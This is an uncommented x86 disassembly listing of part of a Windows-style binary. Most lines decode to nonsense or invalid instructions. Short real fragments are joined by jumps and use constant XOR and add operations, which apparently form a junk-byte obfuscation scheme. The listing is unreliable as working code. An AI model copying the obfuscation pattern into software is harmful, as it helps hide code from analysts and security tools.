  40d66a:	stos   BYTE PTR es:[edi],al
  40d66b:	out    dx,al
  40d66c:	iret   
  40d66d:	imul   ecx,DWORD PTR [ebp-0x416b19ea],0xffffffa3
  40d674:	in     al,0xac
  40d676:	test   ecx,0x5b5a0519
  40d67c:	cld    
  40d67d:	(bad)  
  40d67e:	mov    ebx,0xf4deef95
  40d683:	mov    dl,0xca
  40d685:	mov    dl,0xee
  40d687:	fistp  DWORD PTR [ecx]
  40d689:	mov    al,ds:0x67792059
  40d68e:	nop
  40d68f:	int    0x5
  40d691:	cmp    BYTE PTR [ebx-0x4317d87],0xcc
  40d698:	ret    
  40d699:	test   bh,bh
  40d69b:	inc    eax
  40d69c:	lods   eax,DWORD PTR ds:[esi]
  40d69d:	and    bl,BYTE PTR [esi]
  40d69f:	mov    WORD PTR [eax-0x77],cs
  40d6a2:	jnp    0x40d6d2
  40d6a4:	pop    es
  40d6a5:	jne    0x40d6a2
  40d6a7:	xchg   BYTE PTR [ecx-0x4d],dl
  40d6aa:	xor    al,BYTE PTR [eax+0x60]
  40d6ad:	popa   
  40d6ae:	fsubr  st(7),st
  40d6b0:	not    DWORD PTR [edi]
  40d6b2:	adc    BYTE PTR [esi],bl
  40d6b4:	sbb    BYTE PTR [ecx-0x6],ah
  40d6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6b8:	jb     0x40d6ce
  40d6ba:	sahf   
  40d6bb:	inc    esp
  40d6bc:	cmp    al,0x32
  40d6be:	push   eax
  40d6bf:	xor    ax,0x30b1
  40d6c3:	cmp    DWORD PTR [ebp-0x12],ebp
  40d6c6:	sar    bh,cl
  40d6c8:	ins    DWORD PTR es:[edi],dx
  40d6c9:	call   0xb22f:0x8abc541e
  40d6d0:	jg     0x40d6a2
  40d6d2:	lahf   
  40d6d3:	scas   eax,DWORD PTR es:[edi]
  40d6d4:	pop    edi
  40d6d5:	mov    ebp,0x2d24bb08
  40d6da:	mov    ebx,0x7aa084f9
  40d6df:	dec    esp
  40d6e0:	mov    edi,0xdd84a412
  40d6e5:	add    cl,dh
  40d6e7:	clc    
  40d6e8:	cdq    
  40d6e9:	arpl   WORD PTR [ecx-0x275faa9c],di
  40d6ef:	mov    eax,DWORD PTR [ebp-0x4]
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [edi+0x5278fc1],fs
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d6d4
  40d733:	jecxz  0x40d7ae
  40d735:	out    0xa,al
  40d737:	fsub   QWORD PTR [eax]
  40d739:	mov    ecx,0xbde5d391
  40d73e:	ss mov cl,bh
  40d741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d742:	lods   al,BYTE PTR ds:[esi]
  40d743:	and    cl,BYTE PTR [edx+edx*2]
  40d746:	jae    0x40d74e
  40d748:	sahf   
  40d749:	outs   dx,BYTE PTR ds:[esi]
  40d74a:	adc    eax,DWORD PTR [eax]
  40d74c:	jmp    0x2bca:0x906de8eb
  40d753:	leave  
  40d754:	and    DWORD PTR [esi-0x55a50062],ecx
  40d75a:	icebp  
  40d75b:	bound  esp,QWORD PTR [ebp-0x60]
  40d75e:	les    ecx,FWORD PTR [edi+0x3d]
  40d761:	inc    esp
  40d762:	int3   
  40d763:	test   BYTE PTR [ebp+0x1f],0xe7
  40d767:	test   DWORD PTR [ebx-0x6b],edx
  40d76a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d76b:	scas   al,BYTE PTR es:[edi]
  40d76c:	and    dh,BYTE PTR [ebp-0x60]
  40d76f:	sub    eax,0xfa5456af
  40d774:	cdq    
  40d775:	cmp    eax,0xa3dd5431
  40d77a:	cwde   
  40d77b:	std    
  40d77c:	mov    ch,0xd0
  40d77e:	aam    0x18
  40d780:	sub    BYTE PTR [ecx-0x42728350],dh
  40d786:	jmp    0x52ece461
  40d78b:	sub    eax,0x80dace2c
  40d790:	adc    BYTE PTR [ebp+0x54365c65],cl
  40d796:	xor    DWORD PTR [ebx+0x67c2a80c],ecx
  40d79c:	enter  0xde95,0x93
  40d7a0:	sti    
  40d7a1:	mov    ch,0x37
  40d7a3:	pop    esi
  40d7a4:	scas   al,BYTE PTR es:[edi]
  40d7a5:	out    0x4f,eax
  40d7a7:	je     0x40d7d1
  40d7a9:	addr16 (bad) 
  40d7ab:	jb     0x40d822
  40d7ad:	add    eax,DWORD PTR [esi+0x38]
  40d7b0:	enter  0x4d0c,0x70
  40d7b4:	pop    eax
  40d7b5:	mov    WORD PTR [esi],cs
  40d7b7:	dec    ebx
  40d7b8:	push   ecx
  40d7b9:	jmp    0x372e:0x7b076011
  40d7c0:	dec    esi
  40d7c1:	dec    edx
  40d7c2:	mov    ebx,eax
  40d7c4:	in     eax,dx
  40d7c5:	pop    ebx
  40d7c6:	adc    DWORD PTR [edx-0x5adae599],edx
  40d7cc:	mov    bh,0x17
  40d7ce:	fcomp  QWORD PTR [ecx-0x43]
  40d7d1:	nop
  40d7d2:	push   0x36d3ba7e
  40d7d7:	outs   dx,DWORD PTR ds:[esi]
  40d7d8:	jl     0x40d856
  40d7da:	inc    esp
  40d7db:	leave  
  40d7dc:	sub    eax,0xe50ab446
  40d7e1:	push   esp
  40d7e2:	ins    BYTE PTR es:[edi],dx
  40d7e3:	sbb    al,0xa9
  40d7e5:	adc    eax,0x6e1a9687
  40d7ea:	int3   
  40d7eb:	mov    edi,ecx
  40d7ed:	scas   al,BYTE PTR es:[edi]
  40d7ee:	push   es
  40d7ef:	push   cs
  40d7f0:	(bad)  
  40d7f1:	frstor [esp+edx*8+0x1b]
  40d7f5:	out    dx,eax
  40d7f6:	daa    
  40d7f7:	ror    BYTE PTR [ecx-0x2144c6cc],1
  40d7fd:	test   cl,ah
  40d7ff:	fcom   QWORD PTR [ebx]
  40d801:	sbb    eax,DWORD PTR [eax]
  40d803:	inc    esp
  40d804:	sahf   
  40d805:	dec    edx
  40d806:	mov    ecx,0x2146e40b
  40d80b:	jecxz  0x40d7a7
  40d80d:	mov    edi,0xcc03f807
  40d812:	mov    esi,0x8192d3b6
  40d817:	loop   0x40d7f8
  40d819:	inc    esi
  40d81a:	push   ds
  40d81b:	out    0x3f,al
  40d81d:	cmp    al,0xc2
  40d81f:	clc    
  40d820:	fwait
  40d821:	jb     0x40d89a
  40d823:	and    DWORD PTR [ecx-0x94ee3fe],esi
  40d829:	out    0x71,al
  40d82b:	es adc bh,dh
  40d82e:	dec    ebp
  40d82f:	shr    BYTE PTR [ecx+0x5425f959],1
  40d835:	iret   
  40d836:	fiadd  DWORD PTR [eax+0x3a]
  40d839:	jns    0x40d80a
  40d83b:	dec    edx
  40d83c:	mov    ah,BYTE PTR [edi+0x37a85269]
  40d842:	stos   BYTE PTR es:[edi],al
  40d843:	xor    DWORD PTR [ecx+0x119ab5fe],ebx
  40d849:	je     0x40d7f7
  40d84b:	lods   eax,DWORD PTR ds:[esi]
  40d84c:	dec    esp
  40d84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d84e:	into   
  40d84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d850:	mov    ebx,0x4ef7a523
  40d855:	jnp    0x40d848
  40d857:	clc    
  40d858:	pop    ebp
  40d859:	xor    ebx,DWORD PTR [eax+0x59894279]
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	mov    ds:0x29a5ce26,al
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d84b
  40d885:	fisubr WORD PTR [edx-0x28]
  40d888:	xchg   BYTE PTR [ebx-0x15827342],dh
  40d88e:	lods   eax,DWORD PTR ds:[esi]
  40d88f:	pop    edx
  40d890:	jo     0x40d8a5
  40d892:	push   edx
  40d893:	adc    BYTE PTR [eax-0x339a6cfa],0x40
  40d89a:	rcr    ebx,1
  40d89c:	mov    ch,0x2d
  40d89e:	test   esp,esi
  40d8a0:	fnstenv [edi]
  40d8a2:	fst    DWORD PTR ds:0xdacb0270
  40d8a8:	sbb    BYTE PTR [edi],ch
  40d8aa:	adc    ecx,DWORD PTR ds:0xc1586e8c
  40d8b0:	(bad)  
  40d8b1:	loop   0x40d8a7
  40d8b3:	adc    eax,0xc9ce7003
  40d8b8:	and    ebp,ebx
  40d8ba:	(bad)  
  40d8bb:	mov    DWORD PTR [ecx],ecx
  40d8bd:	lds    eax,FWORD PTR [esp+esi*1-0x46666fd0]
  40d8c4:	jbe    0x40d8cb
  40d8c6:	loopne 0x40d87b
  40d8c8:	pusha  
  40d8c9:	jmp    0x40d854
  40d8cb:	inc    edx
  40d8cc:	add    DWORD PTR [ebp-0x7b8bbc0f],edi
  40d8d2:	fisttp WORD PTR ss:[ebp+0x5f]
  40d8d6:	dec    esi
  40d8d7:	aas    
  40d8d8:	add    al,0xba
  40d8da:	and    eax,0xb0df9503
  40d8df:	jbe    0x40d87e
  40d8e1:	xchg   esi,eax
  40d8e2:	xchg   DWORD PTR [esi+0x4e95cf95],esp
  40d8e8:	in     al,dx
  40d8e9:	dec    esi
  40d8ea:	loop   0x40d95b
  40d8ec:	mov    bl,0x11
  40d8ee:	jae    0x40d8b1
  40d8f0:	mov    dl,0x4
  40d8f2:	and    DWORD PTR [edi-0x4baa1f64],ecx
  40d8f8:	je     0x40d939
  40d8fa:	fwait
  40d8fb:	push   ds
  40d8fc:	pop    ds
  40d8fd:	pushf  
  40d8fe:	sbb    DWORD PTR [edi-0x79],esp
  40d901:	(bad)  
  40d903:	inc    edi
  40d904:	iret   
  40d905:	imul   DWORD PTR [ebx+edi*1-0x15e0a884]
  40d90c:	daa    
  40d90d:	adc    al,0xb2
  40d90f:	(bad)  
  40d910:	xchg   bp,ax
  40d912:	dec    cx
  40d914:	jae    0x40d8ec
  40d916:	bound  edi,QWORD PTR [ebx-0x6f]
  40d919:	xchg   edx,eax
  40d91a:	loop   0x40d902
  40d91c:	and    ebx,ebp
  40d91e:	and    bl,cl
  40d920:	or     al,0x47
  40d922:	dec    edx
  40d923:	add    al,0xbf
  40d925:	push   esp
  40d926:	hlt    
  40d927:	inc    eax
  40d928:	fs push ecx
  40d92a:	mov    al,ds:0xb13dde6a
  40d92f:	push   esp
  40d930:	jae    0x40d9a0
  40d932:	stos   DWORD PTR es:[edi],eax
  40d933:	(bad)  
  40d935:	out    0x59,al
  40d937:	cdq    
  40d938:	jno    0x40d9a8
  40d93a:	std    
  40d93b:	sub    bh,BYTE PTR [eax+0x4f]
  40d93e:	ins    BYTE PTR es:[edi],dx
  40d93f:	and    DWORD PTR [eax+0x6d],esp
  40d942:	jns    0x40d993
  40d944:	push   cs
  40d945:	mov    dl,0x23
  40d947:	push   cs
  40d948:	or     DWORD PTR [edx-0x33],edx
  40d94b:	in     eax,dx
  40d94c:	push   ebp
  40d94d:	or     bl,cl
  40d94f:	jns    0x40d98a
  40d951:	xor    al,0xa7
  40d953:	fimul  DWORD PTR [ebx+eiz*8+0x52]
  40d957:	add    ch,BYTE PTR [ebp-0x3]
  40d95a:	fisttp QWORD PTR [ebx]
  40d95c:	cmp    esp,DWORD PTR [eax]
  40d95e:	mov    DWORD PTR [esi],edi
  40d960:	cmp    bh,al
  40d962:	add    eax,0x6330b5e3
  40d967:	and    BYTE PTR [eax],0x53
  40d96a:	and    eax,0x80aa7ab
  40d96f:	cmp    BYTE PTR [eax+edx*8+0x490c40f],bh
  40d976:	sub    ecx,eax
  40d978:	mul    BYTE PTR [edx+0x7f44bb8d]
  40d97e:	inc    ebx
  40d97f:	or     esi,0xe877504d
  40d985:	fdivr  st(6),st
  40d987:	push   ebp
  40d988:	out    dx,eax
  40d989:	fsubr  QWORD PTR [edi-0x3aa88ec4]
  40d98f:	cdq    
  40d990:	push   ss
  40d991:	xlat   BYTE PTR ds:[ebx]
  40d992:	add    bh,ch
  40d994:	fcom   QWORD PTR [ebx-0x71a9e978]
  40d99a:	neg    BYTE PTR [ebp-0x4f]
  40d99d:	mov    edx,0xff4a2acd
  40d9a2:	retf   0x89c8
  40d9a5:	aam    0xd1
  40d9a7:	sbb    al,0xcc
  40d9a9:	sti    
  40d9aa:	dec    ecx
  40d9ab:	mov    bl,BYTE PTR [ebx-0x7818f3e2]
  40d9b1:	retf   
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	aad    0xbe
  40d9c5:	pop    ss
  40d9c6:	xchg   ebp,ebx
  40d9c8:	mov    edi,DWORD PTR [esi+0x7e]
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40d977
  40d9d0:	ins    BYTE PTR es:[edi],dx
  40d9d1:	mov    dl,bh
  40d9d3:	(bad)  
  40d9d4:	retf   
  40d9d5:	sbb    ch,BYTE PTR [edi]
  40d9d7:	xor    ebp,edx
  40d9d9:	imul   edi,DWORD PTR [edx+ebx*4],0x74f6f2f7
  40d9e0:	sub    BYTE PTR [bx+di-0xa],bl
  40d9e4:	lods   eax,DWORD PTR ds:[esi]
  40d9e5:	mov    ds:0x33f0b6e6,eax
  40d9ea:	popf   
  40d9eb:	mov    ebx,0x7806e541
  40d9f0:	sbb    BYTE PTR [ebx],al
  40d9f2:	xchg   esp,eax
  40d9f3:	mov    cl,ch
  40d9f5:	add    ecx,ebx
  40d9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f8:	cmp    BYTE PTR ds:0x3e7ddc4e,bl
  40d9fe:	sbb    al,0xe6
  40da00:	mov    eax,0xddf213ff
  40da05:	not    BYTE PTR [esi-0xf]
  40da08:	pop    ss
  40da09:	jno    0x40da6b
  40da0b:	jge    0x40da6d
  40da0d:	mov    ebp,0x6ea4a373
  40da12:	or     dh,BYTE PTR [eax]
  40da14:	jo     0x40d9a0
  40da16:	aam    0xb4
  40da18:	int3   
  40da19:	sub    ch,BYTE PTR [eax+0x34b66543]
  40da1f:	call   FWORD PTR [ebx-0x4e]
  40da22:	(bad)  
  40da23:	ja     0x40da7c
  40da25:	pop    edi
  40da26:	stos   BYTE PTR es:[edi],al
  40da27:	cmp    BYTE PTR [edi-0x59a821fb],dl
  40da2d:	jl     0x40da10
  40da2f:	int3   
  40da30:	test   DWORD PTR [esp+eiz*2-0x42fae5d5],edx
  40da37:	cmp    eax,0xc5690f15
  40da3c:	clc    
  40da3d:	mov    bl,0x13
  40da3f:	jge    0x40da70
  40da41:	push   ebp
  40da42:	cld    
  40da43:	jecxz  0x40da35
  40da45:	add    dh,BYTE PTR [ecx+0x56f92962]
  40da4b:	ss xchg ecx,eax
  40da4d:	cmp    ecx,DWORD PTR [esi+ecx*2]
  40da50:	xor    al,0x50
  40da52:	out    0xbb,eax
  40da54:	ror    BYTE PTR [ecx-0x10038062],cl
  40da5a:	fisttp DWORD PTR [edi]
  40da5c:	and    bh,BYTE PTR [eax+0x7f]
  40da5f:	sti    
  40da60:	in     al,dx
  40da61:	sbb    dl,BYTE PTR [edx+0x6fb7de66]
  40da67:	jns    0x40da73
  40da69:	fadd   st(2),st
  40da6b:	lods   al,BYTE PTR ds:[esi]
  40da6c:	pop    edi
  40da6d:	jge    0x40da30
  40da6f:	test   BYTE PTR [ebp+0x7bf5a0ba],bl
  40da75:	aam    0xbe
  40da77:	fmul   QWORD PTR ds:0x2f890f88
  40da7d:	(bad)  
  40da7e:	ds (bad) 
  40da80:	xchg   edx,eax
  40da81:	ins    DWORD PTR es:[edi],dx
  40da82:	xchg   esp,eax
  40da83:	and    dl,BYTE PTR [edx]
  40da85:	fld    st(5)
  40da87:	pop    ds
  40da88:	lods   eax,DWORD PTR ds:[esi]
  40da89:	rcr    DWORD PTR [edi],cl
  40da8b:	push   edi
  40da8c:	clc    
  40da8d:	out    0xfb,al
  40da8f:	mov    ebx,0xc52f330b
  40da94:	push   edi
  40da95:	out    dx,eax
  40da96:	scas   al,BYTE PTR es:[edi]
  40da97:	mov    ah,BYTE PTR [edx+eax*8]
  40da9a:	rol    ebx,1
  40da9c:	ins    DWORD PTR es:[edi],dx
  40da9d:	push   0xfffffff5
  40da9f:	dec    ebp
  40daa0:	aas    
  40daa1:	pop    edi
  40daa2:	sub    al,0xb
  40daa4:	sbb    BYTE PTR [ecx+0x53],ch
  40daa7:	sub    DWORD PTR [edi],edi
  40daa9:	cmp    eax,0x63c93662
  40daae:	int3   
  40daaf:	ficom  DWORD PTR [edx]
  40dab1:	iret   
  40dab2:	call   0xe0cd:0xdb67c070
  40dab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daba:	xor    eax,0xb0c06529
  40dabf:	test   eax,0x2170e325
  40dac4:	aad    0x41
  40dac6:	outs   dx,BYTE PTR ds:[esi]
  40dac7:	enter  0x158,0x23
  40dacb:	xchg   esp,eax
  40dacc:	or     DWORD PTR [edi],0xbf9d0d16
  40dad2:	inc    esi
  40dad3:	pop    ebp
  40dad4:	pop    es
  40dad5:	and    ah,BYTE PTR [ebp+eiz*8-0x1c62c5e3]
  40dadc:	cmp    DWORD PTR [ebx],edi
  40dade:	pop    ebx
  40dadf:	jb     0x40db33
  40dae1:	repz sub BYTE PTR [ecx+0x79],ch
  40dae5:	mov    ch,0x86
  40dae7:	mov    al,0xee
  40dae9:	xchg   edx,eax
  40daea:	(bad)  
  40daeb:	rcl    BYTE PTR [esi-0x80],cl
  40daee:	icebp  
  40daef:	cmp    BYTE PTR [eax-0x4f7b164a],ah
  40daf5:	pusha  
  40daf6:	scas   eax,DWORD PTR es:[edi]
  40daf7:	ret    
  40daf8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40dafa:	(bad)  
  40dafb:	dec    ecx
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x99b6fdf0
  40db32:	mov    ch,0xf3
  40db34:	or     DWORD PTR [bx+si+0x7e7e],0x7e7e7f22
  40db3d:	add    edi,DWORD PTR [ebx+0x3ca6e942]
  40db43:	sub    eax,0xda4420d6
  40db48:	cmp    ch,dh
  40db4a:	adc    esp,ebx
  40db4c:	test   bl,cl
  40db4e:	push   ebx
  40db4f:	clc    
  40db50:	add    DWORD PTR [ecx],ebp
  40db52:	fcom   QWORD PTR [eax+0x45124bd9]
  40db58:	outs   dx,BYTE PTR ds:[esi]
  40db59:	ins    DWORD PTR es:[edi],dx
  40db5a:	stc    
  40db5b:	mov    bl,BYTE PTR [ecx+0x72381fce]
  40db61:	jl     0x40daf4
  40db63:	xchg   esi,eax
  40db64:	sub    eax,0x10093e9
  40db69:	pop    ecx
  40db6a:	mov    dh,0x50
  40db6c:	div    BYTE PTR [edx-0x1d]
  40db6f:	cmp    edx,DWORD PTR [esi+0x3a]
  40db72:	add    ebx,ebp
  40db74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db75:	sbb    eax,DWORD PTR [ebp-0x2a40a87a]
  40db7b:	leave  
  40db7c:	add    ebp,DWORD PTR [ecx+0x1ab27852]
  40db82:	frstor [esi-0x25502585]
  40db88:	mov    al,0x6
  40db8a:	push   ds
  40db8b:	pop    esp
  40db8c:	xor    eax,0x9f12c47
  40db91:	stos   BYTE PTR es:[edi],al
  40db92:	aam    0x84
  40db94:	(bad)  
  40db95:	push   ss
  40db96:	jb     0x40dbf2
  40db98:	adc    dh,BYTE PTR [ecx]
  40db9a:	aam    0x86
  40db9c:	jge    0x40db87
  40db9e:	pop    edx
  40db9f:	inc    ebp
  40dba0:	mov    eax,ds:0x6f50b8fc
  40dba5:	iret   
  40dba6:	inc    esp
  40dba7:	cmp    al,0x49
  40dba9:	out    dx,al
  40dbaa:	mov    eax,0xab1cafd
  40dbaf:	xchg   ebx,eax
  40dbb0:	inc    esp
  40dbb1:	dec    esp
  40dbb2:	cwde   
  40dbb3:	(bad)  
  40dbb4:	mov    BYTE PTR [edi-0x1d8ffb61],bl
  40dbba:	push   esi
  40dbbb:	pop    ecx
  40dbbc:	or     esi,ebp
  40dbbe:	or     eax,0xa7a72115
  40dbc3:	mov    edx,0x41322fec
  40dbc8:	stos   DWORD PTR es:[edi],eax
  40dbc9:	or     DWORD PTR [edi+0x34c54653],edx
  40dbcf:	push   ecx
  40dbd0:	bound  ecx,QWORD PTR [ebx]
  40dbd2:	out    dx,eax
  40dbd3:	mov    ax,ds:0x3dbe05a1
  40dbd9:	dec    esi
  40dbda:	dec    ecx
  40dbdb:	mov    ebx,0x827b7c9d
  40dbe0:	stos   BYTE PTR es:[edi],al
  40dbe1:	sub    cl,ah
  40dbe3:	add    eax,0x8aea6f6d
  40dbe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe9:	xchg   BYTE PTR [esp],ah
  40dbec:	popa   
  40dbed:	nop
  40dbee:	jecxz  0x40dc2a
  40dbf0:	and    eax,0xef692e0a
  40dbf5:	push   esi
  40dbf6:	or     BYTE PTR [ebp-0x5d83be1a],ch
  40dbfc:	jg     0x40dc68
  40dbfe:	pop    esp
  40dbff:	sbb    eax,0xd7a7087a
  40dc04:	xor    bl,ch
  40dc06:	xor    BYTE PTR ss:[edi],ch
  40dc09:	mov    fs,WORD PTR [edx]
  40dc0b:	or     eax,0x5e0b6af7
  40dc10:	jns    0x40dc6c
  40dc12:	xor    eax,0xfff1d1f1
  40dc17:	and    al,0x51
  40dc19:	sub    DWORD PTR [ecx+0x1a],edi
  40dc1c:	stos   BYTE PTR es:[edi],al
  40dc1d:	dec    ecx
  40dc1e:	inc    edi
  40dc1f:	push   esi
  40dc20:	sbb    DWORD PTR [esi+eiz*1+0x776dd2a1],esi
  40dc27:	ret    0xf3b3
  40dc2a:	lock inc edi
  40dc2c:	push   ebp
  40dc2d:	or     eax,0x336044ba
  40dc32:	xchg   esi,eax
  40dc33:	ja     0x40dc51
  40dc35:	clc    
  40dc36:	(bad)  
  40dc37:	mov    edx,0xcddc2692
  40dc3c:	xor    BYTE PTR [edx-0x33],al
  40dc3f:	cli    
  40dc40:	jmp    FWORD PTR ds:[edi]
  40dc43:	xlat   BYTE PTR ds:[ebx]
  40dc44:	sbb    ax,WORD PTR [ebx]
  40dc47:	or     dl,ch
  40dc49:	dec    eax
  40dc4a:	gs pop es
  40dc4c:	es mov dl,0xc4
  40dc4f:	add    BYTE PTR [ecx+0x4c],ch
  40dc52:	adc    BYTE PTR [edx-0xacdbad9],0xe3
  40dc59:	ds mov ecx,0xfc900c65
  40dc5f:	mov    dh,0xab
  40dc61:	cmc    
  40dc62:	jnp    0x40dc57
  40dc64:	push   edi
  40dc65:	imul   ebx,ecx,0xc20370c5
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	nop
  40dcdd:	and    dh,dh
  40dcdf:	lgs    ecx,FWORD PTR [ecx+0x7f227e7e]
  40dce6:	jle    0x40dd66
  40dce8:	cmp    BYTE PTR ds:0x3550cdec,0xc0
  40dcef:	jmp    0x40dd1f
  40dcf1:	xlat   BYTE PTR ds:[ebx]
  40dcf2:	adc    ah,BYTE PTR [eax]
  40dcf4:	adc    al,0x32
  40dcf6:	pop    edi
  40dcf7:	sub    al,0x19
  40dcf9:	fwait
  40dcfa:	mov    edi,DWORD PTR [eax+0x5b]
  40dcfd:	cmp    BYTE PTR [ebx-0x53],dh
  40dd00:	dec    ebp
  40dd01:	aaa    
  40dd02:	jns    0x40dcdd
  40dd04:	mov    WORD PTR [ebp+0x7b],?
  40dd07:	sahf   
  40dd08:	inc    ecx
  40dd09:	or     DWORD PTR [ecx],0x2bf3d7fb
  40dd0f:	pop    ebx
  40dd10:	out    dx,al
  40dd11:	mov    dh,0x31
  40dd13:	clc    
  40dd14:	dec    BYTE PTR [eax-0x41]
  40dd17:	sub    DWORD PTR [esi],ebp
  40dd19:	lods   eax,DWORD PTR ds:[esi]
  40dd1a:	xor    edx,esi
  40dd1c:	jmp    0x1673ce78
  40dd21:	mov    ch,0x24
  40dd23:	mov    BYTE PTR [ebp-0x396f3581],al
  40dd29:	dec    ebx
  40dd2a:	push   eax
  40dd2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd2c:	xlat   BYTE PTR ds:[ebx]
  40dd2d:	mov    ebx,edi
  40dd2f:	xchg   dh,al
  40dd31:	shl    DWORD PTR [edx-0x5322b595],cl
  40dd37:	sub    BYTE PTR [ebx-0x2c],al
  40dd3a:	out    dx,eax
  40dd3b:	retf   0x6dd0
  40dd3e:	sti    
  40dd3f:	icebp  
  40dd40:	dec    ecx
  40dd41:	push   ss
  40dd42:	arpl   WORD PTR [edx],ax
  40dd44:	mov    eax,ds:0x13fad7c4
  40dd49:	lea    edi,[edi-0x1e651a05]
  40dd4f:	jecxz  0x40dd72
  40dd51:	pop    ds
  40dd52:	jecxz  0x40ddb8
  40dd54:	aad    0xa2
  40dd56:	sub    eax,0xf09d7bef
  40dd5b:	repnz lods al,BYTE PTR ds:[esi]
  40dd5d:	sahf   
  40dd5e:	(bad)  
  40dd5f:	dec    BYTE PTR [esi]
  40dd61:	pop    esi
  40dd62:	mov    fs,WORD PTR [edx-0x5a903bd8]
  40dd68:	ficomp WORD PTR [edx]
  40dd6a:	fdiv   DWORD PTR [esi+0x76]
  40dd6d:	mov    bh,0x58
  40dd6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd70:	xor    eax,0x5fd54009
  40dd75:	mov    WORD PTR [ecx+0x18],ds
  40dd78:	cdq    
  40dd79:	inc    ecx
  40dd7a:	fs mov esi,0xee24c1e2
  40dd80:	mov    bl,0xed
  40dd82:	retf   
  40dd83:	sub    eax,0xf1319e57
  40dd88:	sbb    BYTE PTR [esi-0x3b],ah
  40dd8b:	mov    BYTE PTR [ebx+0x127a30e6],dl
  40dd91:	int3   
  40dd92:	mov    ecx,0xb43852d7
  40dd97:	je     0x40dd62
  40dd99:	pop    eax
  40dd9a:	clc    
  40dd9b:	jns    0x40dda2
  40dd9d:	push   esp
  40dd9e:	inc    ecx
  40dd9f:	dec    edi
  40dda0:	lahf   
  40dda1:	sti    
  40dda2:	adc    BYTE PTR [ebx-0x11],ch
  40dda5:	call   0x8e124702
  40ddaa:	xor    al,0x1
  40ddac:	aad    0xb4
  40ddae:	int    0xc7
  40ddb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddb1:	sub    eax,0x7c091adb
